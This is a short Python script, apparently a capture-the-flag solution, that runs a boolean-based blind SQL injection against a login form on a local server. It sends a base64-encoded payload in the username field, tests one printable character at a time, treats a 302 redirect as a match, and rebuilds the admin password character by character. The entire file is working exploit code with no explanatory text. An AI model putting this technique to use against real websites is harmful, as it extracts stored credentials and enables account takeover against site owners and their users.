import requests
import base64

URL = "http://127.0.0.1:5000/"
SEARCHSPACE = ''.join(chr(i) for i in range(32, 127))

flag = ""

while True:
    found = False

    for ch in SEARCHSPACE:
        payload = f"admin' AND SUBSTR(password,{len(flag)+1},1)='{ch}'-- -"
        encoded = base64.b64encode(payload.encode()).decode()

        r = requests.post(URL, data={
            "username": encoded,
            "password": "x"
        }, allow_redirects=False)

        # TRUE = login success → redirect
        if r.status_code == 302:
            flag += ch
            print(f"[+] Found so far: {flag}")
            found = True
            break

    if not found:
        print("\n[*] Extraction complete:", flag)
        break
